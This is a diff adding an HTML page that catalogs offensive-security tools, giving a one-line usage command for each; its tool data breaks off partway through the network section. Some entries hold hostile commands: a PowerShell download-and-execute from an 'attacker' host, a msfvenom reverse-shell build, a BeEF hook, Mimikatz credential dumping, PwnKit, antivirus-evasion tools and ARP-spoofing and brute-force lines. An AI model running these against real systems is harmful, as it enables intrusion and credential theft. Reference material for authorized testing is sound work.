@@ -1,0 +1,646 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CyberSec Pro - World's Premium Cybersecurity Tools Hub</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        :root {
+            --bg-primary: #0a0e17;
+            --bg-secondary: #111827;
+            --bg-card: #1a1f2e;
+            --bg-card-hover: #222a3e;
+            --text-primary: #e8edf5;
+            --text-secondary: #94a3b8;
+            --accent-cyan: #00f0ff;
+            --accent-blue: #3b82f6;
+            --accent-purple: #8b5cf6;
+            --accent-green: #10b981;
+            --accent-red: #ef4444;
+            --accent-orange: #f59e0b;
+            --border-color: #1e293b;
+            --font-main: 'Segoe UI', system-ui, -apple-system, sans-serif;
+        }
+        html { scroll-behavior: smooth; }
+        body {
+            font-family: var(--font-main);
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            line-height: 1.6;
+            min-height: 100vh;
+        }
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: var(--bg-primary); }
+        ::-webkit-scrollbar-thumb { background: var(--accent-cyan); border-radius: 4px; }
+
+        .navbar {
+            position: fixed; top: 0; left: 0; right: 0; z-index: 1000;
+            background: rgba(10,14,23,0.95); backdrop-filter: blur(20px);
+            border-bottom: 1px solid var(--border-color);
+            padding: 0 2rem; height: 70px;
+            display: flex; align-items: center; justify-content: space-between;
+        }
+        .navbar .logo {
+            display: flex; align-items: center; gap: 12px;
+            font-size: 1.5rem; font-weight: 800; text-decoration: none; color: var(--text-primary);
+        }
+        .navbar .logo .logo-icon {
+            width: 40px; height: 40px;
+            background: linear-gradient(135deg, var(--accent-cyan), var(--accent-blue));
+            border-radius: 10px; display: flex; align-items: center; justify-content: center;
+            font-size: 1.3rem; font-weight: bold; color: #000;
+            box-shadow: 0 0 20px rgba(0,240,255,0.3);
+        }
+        .navbar .logo span {
+            background: linear-gradient(135deg, var(--accent-cyan), var(--accent-blue));
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
+        }
+        .nav-links { display: flex; align-items: center; gap: 0.5rem; list-style: none; }
+        .nav-links a {
+            color: var(--text-secondary); text-decoration: none;
+            padding: 0.5rem 1rem; border-radius: 8px;
+            font-size: 0.9rem; font-weight: 500;
+            transition: all 0.3s ease; position: relative;
+        }
+        .nav-links a:hover, .nav-links a.active {
+            color: var(--accent-cyan); background: rgba(0,240,255,0.08);
+        }
+        .hamburger {
+            display: none; flex-direction: column; cursor: pointer;
+            gap: 5px; background: none; border: none; padding: 5px;
+        }
+        .hamburger span {
+            width: 25px; height: 2px; background: var(--text-primary);
+            border-radius: 2px; transition: 0.3s ease;
+        }
+
+        .page { display: none; padding-top: 90px; min-height: 100vh; animation: fadeIn 0.5s ease; }
+        .page.active { display: block; }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .container { max-width: 1280px; margin: 0 auto; padding: 0 2rem 3rem; }
+
+        .hero { text-align: center; padding: 3rem 1rem 2rem; position: relative; }
+        .hero::before {
+            content: ''; position: absolute; top: -50%; left: 50%;
+            transform: translateX(-50%);
+            width: 600px; height: 600px;
+            background: radial-gradient(circle, rgba(0,240,255,0.05), transparent 70%);
+            pointer-events: none;
+        }
+        .hero .badge {
+            display: inline-block; background: rgba(0,240,255,0.1);
+            border: 1px solid rgba(0,240,255,0.3); color: var(--accent-cyan);
+            padding: 0.4rem 1.2rem; border-radius: 50px;
+            font-size: 0.85rem; font-weight: 600; margin-bottom: 1.5rem;
+        }
+        .hero h1 {
+            font-size: 3rem; font-weight: 800; margin-bottom: 1rem;
+            background: linear-gradient(135deg, var(--text-primary), var(--accent-cyan));
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text;
+        }
+        .hero p {
+            font-size: 1.15rem; color: var(--text-secondary);
+            max-width: 700px; margin: 0 auto 2rem;
+        }
+        .hero .stats { display: flex; justify-content: center; gap: 3rem; flex-wrap: wrap; }
+        .hero .stat-item { text-align: center; }
+        .hero .stat-item .num { font-size: 2rem; font-weight: 800; color: var(--accent-cyan); }
+        .hero .stat-item .label { font-size: 0.85rem; color: var(--text-secondary); }
+
+        .page-header { text-align: center; padding: 1.5rem 1rem 1rem; }
+        .page-header h1 { font-size: 2.2rem; font-weight: 800; margin-bottom: 0.5rem; }
+        .page-header p { color: var(--text-secondary); max-width: 600px; margin: 0 auto; font-size: 1.05rem; }
+
+        .tools-grid {
+            display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
+            gap: 1.5rem; margin-top: 2rem;
+        }
+        .tool-card {
+            background: var(--bg-card); border: 1px solid var(--border-color);
+            border-radius: 16px; padding: 1.5rem;
+            transition: all 0.3s ease; position: relative; overflow: hidden;
+        }
+        .tool-card::before {
+            content: ''; position: absolute; top: 0; left: 0; right: 0; height: 3px;
+            background: linear-gradient(90deg, var(--accent-cyan), var(--accent-blue));
+            opacity: 0; transition: opacity 0.3s ease;
+        }
+        .tool-card:hover::before { opacity: 1; }
+        .tool-card:hover {
+            border-color: rgba(0,240,255,0.3); transform: translateY(-4px);
+            box-shadow: 0 12px 40px rgba(0,0,0,0.4); background: var(--bg-card-hover);
+        }
+        .tool-card h3 { font-size: 1.15rem; font-weight: 700; margin-bottom: 0.4rem; }
+        .tool-card .tool-cat {
+            font-size: 0.75rem; color: var(--accent-cyan);
+            background: rgba(0,240,255,0.1); display: inline-block;
+            padding: 0.2rem 0.7rem; border-radius: 50px; margin-bottom: 0.7rem; font-weight: 600;
+        }
+        .tool-card p { color: var(--text-secondary); font-size: 0.92rem; margin-bottom: 1rem; }
+        .tool-card .tool-use {
+            background: rgba(0,0,0,0.3); border-radius: 8px; padding: 0.8rem;
+            font-size: 0.82rem; color: var(--text-secondary); border-left: 2px solid var(--accent-cyan);
+        }
+        .tool-card .tool-use code {
+            color: var(--accent-green); font-family: 'Consolas', monospace;
+            font-size: 0.8rem; word-break: break-all;
+        }
+        .tool-card .tool-tag {
+            display: inline-block; font-size: 0.7rem; padding: 0.15rem 0.5rem;
+            border-radius: 4px; margin-right: 0.3rem; margin-top: 0.5rem; font-weight: 600;
+        }
+        .tool-card .tool-tag.free { background: rgba(16,185,129,0.15); color: var(--accent-green); }
+        .tool-card .tool-tag.paid { background: rgba(245,158,11,0.15); color: var(--accent-orange); }
+        .tool-card .tool-tag.best { background: rgba(0,240,255,0.15); color: var(--accent-cyan); }
+
+        .search-box { max-width: 500px; margin: 0 auto 2rem; position: relative; }
+        .search-box input {
+            width: 100%; padding: 0.9rem 1.2rem 0.9rem 3rem;
+            background: var(--bg-card); border: 1px solid var(--border-color);
+            border-radius: 12px; color: var(--text-primary);
+            font-size: 0.95rem; font-family: var(--font-main);
+            transition: all 0.3s ease; outline: none;
+        }
+        .search-box input:focus { border-color: var(--accent-cyan); box-shadow: 0 0 20px rgba(0,240,255,0.1); }
+        .search-box .search-icon {
+            position: absolute; left: 1rem; top: 50%;
+            transform: translateY(-50%); color: var(--text-secondary);
+        }
+
+        .category-cards {
+            display: grid; grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+            gap: 1.2rem; margin-top: 2rem;
+        }
+        .category-card {
+            background: var(--bg-card); border: 1px solid var(--border-color);
+            border-radius: 14px; padding: 1.5rem; text-align: center;
+            cursor: pointer; transition: all 0.3s ease;
+            text-decoration: none; color: var(--text-primary);
+        }
+        .category-card:hover {
+            border-color: var(--accent-cyan); transform: translateY(-4px);
+            box-shadow: 0 0 20px rgba(0,240,255,0.3);
+        }
+        .category-card .cat-icon { font-size: 2.2rem; margin-bottom: 0.8rem; }
+        .category-card h3 { font-size: 1.05rem; font-weight: 700; }
+        .category-card p { color: var(--text-secondary); font-size: 0.85rem; margin-top: 0.3rem; }
+        .category-card .count {
+            display: inline-block; margin-top: 0.6rem; font-size: 0.75rem;
+            background: rgba(0,240,255,0.1); color: var(--accent-cyan); padding: 0.2rem 0.8rem; border-radius: 50px;
+        }
+
+        .tips-section { margin-top: 3rem; }
+        .tips-section h2 { font-size: 1.8rem; font-weight: 700; margin-bottom: 1.5rem; text-align: center; }
+        .tips-grid {
+            display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 1.5rem;
+        }
+        .tip-card {
+            background: var(--bg-card); border: 1px solid var(--border-color);
+            border-radius: 14px; padding: 1.5rem; transition: all 0.3s ease;
+        }
+        .tip-card:hover { border-color: rgba(0,240,255,0.3); transform: translateY(-2px); }
+        .tip-card .tip-num {
+            width: 36px; height: 36px; border-radius: 50%;
+            background: linear-gradient(135deg, var(--accent-cyan), var(--accent-blue));
+            display: flex; align-items: center; justify-content: center;
+            font-weight: 800; font-size: 0.9rem; color: #000; margin-bottom: 0.8rem;
+        }
+        .tip-card h3 { font-size: 1.05rem; margin-bottom: 0.5rem; }
+        .tip-card p { color: var(--text-secondary); font-size: 0.9rem; }
+
+        .footer {
+            text-align: center; padding: 2.5rem 2rem;
+            border-top: 1px solid var(--border-color); margin-top: 3rem;
+            color: var(--text-secondary); font-size: 0.85rem;
+        }
+        .footer .footer-links { display: flex; justify-content: center; gap: 1.5rem; margin-bottom: 1rem; flex-wrap: wrap; }
+        .footer .footer-links a { color: var(--text-secondary); text-decoration: none; }
+        .footer .footer-links a:hover { color: var(--accent-cyan); }
+
+        @media (max-width: 768px) {
+            .navbar { padding: 0 1rem; }
+            .hamburger { display: flex; }
+            .nav-links {
+                display: none; position: absolute; top: 70px; left: 0; right: 0;
+                background: rgba(10,14,23,0.98); flex-direction: column; padding: 1rem;
+                border-bottom: 1px solid var(--border-color); gap: 0.3rem;
+            }
+            .nav-links.open { display: flex; }
+            .nav-links a { width: 100%; text-align: center; padding: 0.8rem; }
+            .hero h1 { font-size: 1.8rem; }
+            .hero .stats { gap: 1.5rem; }
+            .container { padding: 0 1rem 2rem; }
+            .tools-grid { grid-template-columns: 1fr; }
+            .category-cards { grid-template-columns: repeat(2, 1fr); }
+            .tips-grid { grid-template-columns: 1fr; }
+        }
+        @media (max-width: 480px) {
+            .category-cards { grid-template-columns: 1fr; }
+            .hero h1 { font-size: 1.5rem; }
+        }
+    </style>
+</head>
+<body>
+
+<nav class="navbar">
+    <a href="#" class="logo" onclick="showPage('home')">
+        <div class="logo-icon">&#9760;</div>
+        <span>CyberSec Pro</span>
+    </a>
+    <button class="hamburger" onclick="toggleMenu()" aria-label="Menu">
+        <span></span><span></span><span></span>
+    </button>
+    <ul class="nav-links" id="navLinks">
+        <li><a href="#" class="active" data-page="home" onclick="showPage('home')">Home</a></li>
+        <li><a href="#" data-page="recon" onclick="showPage('recon')">Recon &amp; OSINT</a></li>
+        <li><a href="#" data-page="web" onclick="showPage('web')">Web Security</a></li>
+        <li><a href="#" data-page="exploit" onclick="showPage('exploit')">Exploitation</a></li>
+        <li><a href="#" data-page="password" onclick="showPage('password')">Password</a></li>
+        <li><a href="#" data-page="network" onclick="showPage('network')">Network</a></li>
+        <li><a href="#" data-page="forensic" onclick="showPage('forensic')">Forensics</a></li>
+        <li><a href="#" data-page="tips" onclick="showPage('tips')">Pro Tips</a></li>
+    </ul>
+</nav>
+
+<div class="page active" id="page-home">
+    <div class="container">
+        <div class="hero">
+            <div class="badge">&#9889; World's Premium Cybersecurity Tools Hub</div>
+            <h1>CyberSec Pro Toolkit</h1>
+            <p>100+ Best-in-Class Cybersecurity Tools — Reconnaissance to Forensics. Every tool with usage guide, commands, and professional tips. Built for ethical hackers, pentesters, and security professionals.</p>
+            <div class="stats">
+                <div class="stat-item"><div class="num">100+</div><div class="label">Security Tools</div></div>
+                <div class="stat-item"><div class="num">8</div><div class="label">Categories</div></div>
+                <div class="stat-item"><div class="num">100%</div><div class="label">Free Resources</div></div>
+            </div>
+        </div>
+
+        <h2 style="text-align:center;font-size:1.6rem;font-weight:700;margin:2rem 0 0.5rem;">Explore Tool Categories</h2>
+        <p style="text-align:center;color:var(--text-secondary);margin-bottom:1.5rem;">Click any category to explore detailed tools</p>
+
+        <div class="category-cards">
+            <a class="category-card" onclick="showPage('recon')">
+                <div class="cat-icon">&#128270;</div>
+                <h3>Reconnaissance &amp; OSINT</h3>
+                <p>Information gathering, subdomain discovery, email enumeration</p>
+                <span class="count">15+ Tools</span>
+            </a>
+            <a class="category-card" onclick="showPage('web')">
+                <div class="cat-icon">&#127760;</div>
+                <h3>Web Application Security</h3>
+                <p>Web scanning, SQL injection, XSS, API testing</p>
+                <span class="count">18+ Tools</span>
+            </a>
+            <a class="category-card" onclick="showPage('exploit')">
+                <div class="cat-icon">&#9889;</div>
+                <h3>Exploitation Frameworks</h3>
+                <p>Metasploit, payloads, browser exploitation, C2</p>
+                <span class="count">12+ Tools</span>
+            </a>
+            <a class="category-card" onclick="showPage('password')">
+                <div class="cat-icon">&#128273;</div>
+                <h3>Password &amp; Cracking</h3>
+                <p>Password recovery, hash cracking, brute force</p>
+                <span class="count">14+ Tools</span>
+            </a>
+            <a class="category-card" onclick="showPage('network')">
+                <div class="cat-icon">&#127937;</div>
+                <h3>Network &amp; Wireless</h3>
+                <p>Packet analysis, Wi-Fi hacking, network scanning</p>
+                <span class="count">16+ Tools</span>
+            </a>
+            <a class="category-card" onclick="showPage('forensic')">
+                <div class="cat-icon">&#128187;</div>
+                <h3>Forensics &amp; Analysis</h3>
+                <p>Disk forensics, memory analysis, log analysis</p>
+                <span class="count">12+ Tools</span>
+            </a>
+            <a class="category-card" onclick="showPage('tips')">
+                <div class="cat-icon">&#128161;</div>
+                <h3>Professional Tips</h3>
+                <p>Expert methodology, best practices, career advice</p>
+                <span class="count">30+ Tips</span>
+            </a>
+            <a class="category-card" onclick="showPage('home')" style="border-color:rgba(0,240,255,0.3);">
+                <div class="cat-icon">&#128640;</div>
+                <h3>All Tools Combined</h3>
+                <p>Complete master list with search &amp; filter</p>
+                <span class="count">100+ Total</span>
+            </a>
+        </div>
+
+        <div class="tips-section">
+            <h2>&#128161; Quick Professional Tips</h2>
+            <div class="tips-grid">
+                <div class="tip-card">
+                    <div class="tip-num">1</div>
+                    <h3>Always Start with Recon</h3>
+                    <p>80% of successful pentests depend on good recon. Spend 60% of your time on information gathering before running any exploit.</p>
+                </div>
+                <div class="tip-card">
+                    <div class="tip-num">2</div>
+                    <h3>Document Everything</h3>
+                    <p>Maintain detailed notes of every command, output, and finding. Use tools like CherryTree or KeepNote for organized reporting.</p>
+                </div>
+                <div class="tip-card">
+                    <div class="tip-num">3</div>
+                    <h3>Master the CLI</h3>
+                    <p>GUI tools are slower. Learn command-line versions of tools — they're faster, scriptable, and work over SSH.</p>
+                </div>
+                <div class="tip-card">
+                    <div class="tip-num">4</div>
+                    <h3>Stay Legal &amp; Ethical</h3>
+                    <p>Always have written authorization. Use these tools only on systems you own or have explicit permission to test.</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="footer">
+            <div class="footer-links">
+                <a href="#" onclick="showPage('home')">Home</a>
+                <a href="#" onclick="showPage('recon')">Recon</a>
+                <a href="#" onclick="showPage('web')">Web Security</a>
+                <a href="#" onclick="showPage('exploit')">Exploitation</a>
+                <a href="#" onclick="showPage('password')">Password</a>
+                <a href="#" onclick="showPage('network')">Network</a>
+                <a href="#" onclick="showPage('forensic')">Forensics</a>
+                <a href="#" onclick="showPage('tips')">Pro Tips</a>
+            </div>
+            <p>&copy; 2026 <strong>CyberSec Pro</strong> &mdash; Premium Cybersecurity Tools Hub.</p>
+        </div>
+    </div>
+</div>
+
+<div id="toolPagesContainer"></div>
+
+<script>
+const toolsData = {
+    recon: {
+        title: "Reconnaissance & OSINT Tools",
+        subtitle: "Information gathering, subdomain enumeration, email discovery, passive & active recon",
+        tools: [
+            { name: "Nmap", cat: "Network Scanner", icon: "cyan", desc: "The industry standard network discovery and port scanning tool.", use: "nmap -sV -sC -O -A target.com - Full scan with version detection, scripts, OS fingerprint", tags: ["free","best"] },
+            { name: "Shodan", cat: "Device Search Engine", icon: "blue", desc: "Search engine for internet-connected devices. Find exposed cameras, servers, ICS/SCADA systems.", use: "Search: port:22 country:IN - Find SSH servers in India", tags: ["free"] },
+            { name: "Amass", cat: "Subdomain Enumeration", icon: "purple", desc: "Advanced subdomain discovery tool by OWASP.", use: "amass enum -d target.com - Passive enumeration", tags: ["free","best"] },
+            { name: "Recon-ng", cat: "OSINT Framework", icon: "green", desc: "Full-featured reconnaissance framework with modules for DNS, WHOIS, social media.", use: "recon-ng - marketplace install all - workspace create target", tags: ["free"] },
+            { name: "theHarvester", cat: "Email & Domain OSINT", icon: "red", desc: "Gather emails, subdomains, IPs from public sources.", use: "theHarvester -d target.com -b google,linkedin,bing", tags: ["free"] },
+            { name: "Maltego", cat: "OSINT & Link Analysis", icon: "orange", desc: "Powerful data mining and link analysis tool.", use: "Use transforms: DNS to IP, Email to Social Media, Domain to WHOIS", tags: ["free"] },
+            { name: "Sublist3r", cat: "Subdomain Discovery", icon: "pink", desc: "Fast subdomain enumeration using search engines.", use: "sublist3r -d target.com - Quick subdomain discovery", tags: ["free"] },
+            { name: "SpiderFoot", cat: "Automated OSINT", icon: "cyan", desc: "Automated OSINT framework across 200+ data sources.", use: "spiderfoot -s target.com -o report.html", tags: ["free"] },
+            { name: "Whois Lookup", cat: "Domain Intelligence", icon: "blue", desc: "Query domain registration details.", use: "whois target.com - Get full domain registration info", tags: ["free"] },
+            { name: "DNSRecon", cat: "DNS Enumeration", icon: "purple", desc: "Advanced DNS enumeration tool.", use: "dnsrecon -d target.com -t std", tags: ["free"] },
+            { name: "Google Dorking", cat: "Search Engine OSINT", icon: "green", desc: "Advanced Google search operators for sensitive data.", use: 'site:target.com filetype:pdf confidential', tags: ["free","best"] },
+            { name: "WhatWeb", cat: "Website Fingerprinting", icon: "red", desc: "Identify CMS, frameworks, libraries, and server software.", use: "whatweb target.com - Fingerprint website technology", tags: ["free"] },
+            { name: "Wayback Machine / gau", cat: "Historical URLs", icon: "orange", desc: "Fetch historical URLs from Wayback Machine.", use: "gau target.com | grep '.php' - Get historical PHP URLs", tags: ["free"] },
+            { name: "PhoneInfoga", cat: "Phone OSINT", icon: "pink", desc: "Advanced phone number OSINT tool.", use: "phoneinfoga scan -n +919876543210", tags: ["free"] },
+            { name: "Social-Engineer Toolkit", cat: "Social Engineering", icon: "cyan", desc: "Framework for phishing, credential harvesting, website cloning.", use: "setoolkit - Social-Engineering Attacks - Website Attack Vectors", tags: ["free","best"] }
+        ]
+    },
+    web: {
+        title: "Web Application Security Tools",
+        subtitle: "Web scanning, SQL injection, XSS, API testing, CMS exploitation, directory busting",
+        tools: [
+            { name: "Burp Suite Professional", cat: "Web Proxy & Scanner", icon: "cyan", desc: "The #1 web application security testing platform.", use: "Set browser proxy to 127.0.0.1:8080. Intercept requests - Send to Intruder/Repeater/Scanner", tags: ["paid","best"] },
+            { name: "OWASP ZAP", cat: "Web Scanner", icon: "blue", desc: "Free open-source web app scanner.", use: "zap.sh -daemon -port 8080 - then zap-cli quick-scan target.com", tags: ["free","best"] },
+            { name: "sqlmap", cat: "SQL Injection", icon: "purple", desc: "Automated SQL injection tool for all major databases.", use: "sqlmap -u 'http://target.com/page?id=1' --dbs - Enumerate databases", tags: ["free","best"] },
+            { name: "Nikto", cat: "Web Server Scanner", icon: "green", desc: "Scans for 6700+ dangerous files and outdated software.", use: "nikto -h target.com -ssl - Scan HTTPS server", tags: ["free"] },
+            { name: "Gobuster", cat: "Directory Busting", icon: "red", desc: "Discover hidden directories and files.", use: "gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt", tags: ["free","best"] },
+            { name: "WPScan", cat: "WordPress Scanner", icon: "orange", desc: "WordPress vulnerability scanner.", use: "wpscan --url target.com --enumerate p,t,u", tags: ["free","best"] },
+            { name: "FFUF", cat: "Fast Fuzzer", icon: "pink", desc: "Fast web fuzzer for directories, parameters, and vhosts.", use: "ffuf -u http://target.com/FUZZ -w wordlist.txt", tags: ["free","best"] },
+            { name: "XSStrike", cat: "Advanced XSS Scanner", icon: "cyan", desc: "Multi-threaded XSS scanner with WAF bypass.", use: "xsstrike -u 'http://target.com/search?q=test' --crawl", tags: ["free"] },
+            { name: "Joomscan", cat: "Joomla Scanner", icon: "blue", desc: "Vulnerability scanner for Joomla CMS.", use: "joomscan -u target.com", tags: ["free"] },
+            { name: "WFuzz", cat: "Web Fuzzer", icon: "purple", desc: "Web fuzzer for parameters and content injection.", use: "wfuzz -c -z file,wordlist.txt --hc 404 http://target.com/FUZZ", tags: ["free"] },
+            { name: "Dirsearch", cat: "Directory Scanner", icon: "green", desc: "Advanced directory brute-forcing tool.", use: "dirsearch -u target.com -e php,html,txt", tags: ["free"] },
+            { name: "Acunetix", cat: "Enterprise Web Scanner", icon: "red", desc: "Enterprise-grade web vulnerability scanner.", use: "Configure target - Full scan - Review findings with PoC evidence", tags: ["paid"] },
+            { name: "Postman", cat: "API Testing", icon: "orange", desc: "API development and testing platform.", use: "Import API collection - Send requests - Check for auth bypass, IDOR", tags: ["free"] },
+            { name: "Retire.js", cat: "JavaScript Scanner", icon: "pink", desc: "Scan for outdated JS libraries with known vulnerabilities.", use: "retire --outputformat txt --outputpath report.txt", tags: ["free"] },
+            { name: "CORS Scanner", cat: "CORS Tester", icon: "cyan", desc: "Test for misconfigured CORS policies.", use: "Send Origin: https://attacker.com - Check Access-Control-Allow-Origin header", tags: ["free"] },
+            { name: "Droopescan", cat: "CMS Scanner", icon: "blue", desc: "Scanner for Drupal, Joomla, WordPress.", use: "droopescan scan drupal -u target.com", tags: ["free"] }
+        ]
+    },
+    exploit: {
+        title: "Exploitation Frameworks & Payloads",
+        subtitle: "Metasploit, C2 frameworks, browser exploitation, reverse shells, and payload generation",
+        tools: [
+            { name: "Metasploit Framework", cat: "Exploitation Framework", icon: "cyan", desc: "2000+ exploits, payloads, encoders, and post-exploitation modules.", use: "msfconsole - search type:exploit - use exploit/multi/handler - set PAYLOAD windows/meterpreter/reverse_tcp - exploit", tags: ["free","best"] },
+            { name: "Armitage", cat: "GUI Metasploit", icon: "blue", desc: "Graphical cyber attack management tool for Metasploit.", use: "armitage - Connect to Metasploit - Visual host overview - Right-click to launch exploits", tags: ["free"] },
+            { name: "Cobalt Strike", cat: "C2 Framework", icon: "purple", desc: "Premium adversary simulation tool with advanced C2 capabilities.", use: "Team server setup - Deploy beacon payloads - Use Malleable C2 to evade detection", tags: ["paid","best"] },
+            { name: "BeEF", cat: "Browser Exploitation", icon: "green", desc: "Browser Exploitation Framework. Hook browsers via XSS.", use: "beef-xss - Hook URL with script src='http://your-ip:3000/hook.js'", tags: ["free","best"] },
+            { name: "Empire", cat: "Post-Exploitation", icon: "red", desc: "PowerShell/Python post-exploitation agent framework.", use: "powershell-empire server - ./starkiller - Deploy agents - Run modules", tags: ["free"] },
+            { name: "MSFvenom", cat: "Payload Generator", icon: "orange", desc: "Generate and encode payloads in multiple formats.", use: "msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe", tags: ["free","best"] },
+            { name: "Searchsploit", cat: "Exploit Database", icon: "pink", desc: "Offline exploit-db search tool.", use: "searchsploit apache 2.4.49 - Find exploits for Apache 2.4.49", tags: ["free","best"] },
+            { name: "Veil Evasion", cat: "AV Evasion", icon: "cyan", desc: "Generate payloads that bypass antivirus.", use: "veil - use evasion - list - use python/shellcode_inject/base64.py", tags: ["free"] },
+            { name: "Shellter", cat: "Dynamic Shellcode Injector", icon: "blue", desc: "Dynamic PE injector for AV evasion.", use: "shellter - Select PE file - Choose payload - Generate backdoored executable", tags: ["free"] },
+            { name: "Nishang", cat: "PowerShell Exploitation", icon: "purple", desc: "PowerShell based exploitation and post-exploitation.", use: "powershell -exec bypass -Command IEX(New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')", tags: ["free"] },
+            { name: "Covenant", cat: ".NET C2 Framework", icon: "green", desc: "Open-source .NET C2 framework for red teaming.", use: "Deploy via Docker - Create Listener - Generate Grunt - Deploy", tags: ["free"] },
+            { name: "PwnKit", cat: "LPE Exploit", icon: "red", desc: "CVE-2021-4034 pkexec LPE for Linux.", use: "gcc pwnkit.c -o pwnkit - ./pwnkit - Get root shell", tags: ["free"] }
+        ]
+    },
+    password: {
+        title: "Password Cracking & Authentication Tools",
+        subtitle: "Hash cracking, brute force, password recovery, dictionary attacks, and credential analysis",
+        tools: [
+            { name: "Hashcat", cat: "GPU Password Cracker", icon: "cyan", desc: "World's fastest GPU-based password recovery tool. 300+ hash types.", use: "hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt - Crack NTLM hashes", tags: ["free","best"] },
+            { name: "John the Ripper", cat: "Password Cracker", icon: "blue", desc: "Classic password cracker for Unix, Windows, LDAP hashes.", use: "john --wordlist=rockyou.txt hash.txt - Dictionary attack", tags: ["free","best"] },
+            { name: "Hydra", cat: "Online Brute Force", icon: "purple", desc: "Fast online brute-forcer for SSH, FTP, HTTP, MySQL, RDP, VNC.", use: "hydra -l admin -P passwords.txt ssh://target.com - SSH brute force", tags: ["free","best"] },
+            { name: "Medusa", cat: "Parallel Brute Forcer", icon: "green", desc: "Highly parallel online password brute-forcer.", use: "medusa -h target.com -u admin -P passwords.txt -M ssh", tags: ["free"] },
+            { name: "CeWL", cat: "Custom Wordlist Generator", icon: "red", desc: "Generate wordlists by spidering target website.", use: "cewl http://target.com -w custom-wordlist.txt", tags: ["free"] },
+            { name: "Crunch", cat: "Wordlist Generator", icon: "orange", desc: "Generate custom password wordlists based on patterns.", use: "crunch 8 10 0123456789 -o 8digit.txt", tags: ["free"] },
+            { name: "Mimikatz", cat: "Windows Credential Theft", icon: "pink", desc: "Extract plaintext passwords and hashes from Windows memory.", use: "mimikatz.exe - privilege::debug - sekurlsa::logonpasswords", tags: ["free","best"] },
+            { name: "Responder", cat: "LLMNR/NBT-NS Poisoner", icon: "cyan", desc: "Capture NTLMv1/v2 hashes on Windows networks.", use: "responder -I eth0 -dwP - Capture hashes to /usr/share/responder/logs/", tags: ["free","best"] },
+            { name: "Impacket", cat: "Windows Credential Dumper", icon: "blue", desc: "Extract Windows credentials remotely.", use: "secretsdump.py domain/user:Pass@target.com - Dump remote hashes", tags: ["free","best"] },
+            { name: "ophcrack", cat: "Windows Password Cracker", icon: "purple", desc: "Crack LM/NTLM hashes using rainbow tables.", use: "ophcrack -d /path/to/tables -t hash.txt", tags: ["free"] },
+            { name: "Patator", cat: "Multi-Protocol Brute Forcer", icon: "green", desc: "Flexible brute-forcer for multiple protocols.", use: "patator ssh_login host=target.com user=admin password=FILE0 0=passwords.txt", tags: ["free"] },
+            { name: "chntpw", cat: "Windows Password Reset", icon: "red", desc: "Offline Windows password and registry editor.", use: "Boot Linux live CD - chntpw -u Administrator /mnt/windows/System32/config/SAM", tags: ["free"] },
+            { name: "LAPSToolkit", cat: "LAPS Password Analysis", icon: "orange", desc: "Analyze LAPS passwords from Active Directory.", use: "Get-LAPSComputers - Get-StoredLocalPassword -ComputerName PC01", tags: ["free"] }
+        ]
+    },
+    network: {
+        title: "Network & Wireless Security Tools",
+        subtitle: "Packet analysis, Wi-Fi hacking, network monitoring, sniffing, and traffic manipulation",
+        tools: [
+            { name: "Wireshark", cat: "Packet Analyzer", icon: "cyan", desc: "World's most popular network protocol analyzer.", use: "Capture live - Filter: http.request, tcp.port==443 - Follow TCP/UDP streams", tags: ["free","best"] },
+            { name: "tcpdump", cat: "CLI Packet Capture", icon: "blue", desc: "Command-line packet capture and analysis.", use: "tcpdump -i eth0 -w capture.pcap - Capture to file", tags: ["free","best"] },
+            { name: "Aircrack-ng", cat: "Wi-Fi Security Suite", icon: "purple", desc: "Complete Wi-Fi security assessment suite.", use: "airmon-ng start wlan0 - airodump-ng wlan0mon - aircrack-ng -w wordlist.txt handshake.cap", tags: ["free","best"] },
+            { name: "Wifite", cat: "Automated Wi-Fi Hacking", icon: "green", desc: "Automated Wi-Fi auditing tool.", use: "wifite - Auto-detect, scan, select target, crack automatically", tags: ["free"] },
+            { name: "Kismet", cat: "Wireless Sniffer & IDS", icon: "red", desc: "Wireless network detector and sniffer.", use: "kismet - Web interface at http://localhost:2501", tags: ["free"] },
+            { name: "Bettercap", cat: "MITM Framework", icon: "orange", desc: "Advanced MITM framework for network attacks.", use: "bettercap -iface eth0 - set arp.spoof.targets 10.0.0.5 - arp.spoof on - net.sniff on", tags: ["free","best"] },
+            { name: "Ettercap", cat: "MITM & Sniffing", icon: "pink", desc: "Classic MITM tool for ARP poisoning.", use: "ettercap -T -M arp /10.0.0.5// /10.0.0.1//", tags: ["free"] },
+            { name: "Zmap", cat: "Internet Scanner", icon: "cyan", desc: "Massive internet scanner for IPv4.", use: "zmap -p 443 0.0.0.0/0 - Scan entire internet for HTTPS", tags: ["free"] },
+            { name: "Masscan", cat: "High-Speed Scanner", icon: "blue", desc: "Asynchronous TCP scanner faster than Nmap.", use: "masscan -p22,80,443 192.168.0.0/16 --rate=10000", tags: ["free"] },
+            { name: "Reaver", cat: "WPS Attack Tool", icon: "purple", desc: "Brute-force WPS PINs to recover WPA/WPA2 passphrases.", use: "wash -i wlan0mon - reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1", tags: ["free"] },
+            { name: "MDK4", cat: "Wi-Fi Stress Testing", icon: "green", desc: "Wi-Fi DoS testing tool.", use: "mdk4 wlan0mon d -B AA:BB:CC:DD:EE:FF - Deauth attack", tags: ["free"] },
+            { name: "Hping3", cat: "Packet Crafting", icon: "red", desc: "TCP/IP packet crafting and analysis tool.", use: "hping3 -S target.com -p 80 -c 1 - Send SYN packet", tags: ["free"] },
